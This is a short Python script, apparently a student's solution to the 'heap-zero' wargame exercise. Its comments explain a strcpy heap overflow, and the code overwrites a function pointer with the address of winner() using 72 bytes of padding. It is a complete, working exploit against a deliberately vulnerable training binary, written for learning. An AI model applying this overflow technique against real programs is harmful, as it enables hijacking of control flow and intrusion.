from subprocess import Popen, PIPE
 
# What was the bug? There was a buffer with a fixed size that could be overflowed to change
# the address of a function pointer that was next in memory.
 
# Where was the bug? The bug was in a 'strcpy' call from user input into a buffer,
# where a function pointer is the next thing in memory, and it is later called on.
 
# How did you exploit it? Found the address of winner() function. Then overflowed buffer 
# and add address of winner() to the end of it.
 
address = b'\x35\x88\x04\x08'
buffer_len = 72
buffer_fill = b'A'*buffer_len
 
argument = buffer_fill + address
 
# Popen opens up executable, universal_lines allows for input to be treated like a string.
p = Popen(["/home/troy/Documents/probsets/heap-zero", argument], stdin=PIPE, stdout=PIPE, stderr=PIPE)
output = p.communicate()
print(output)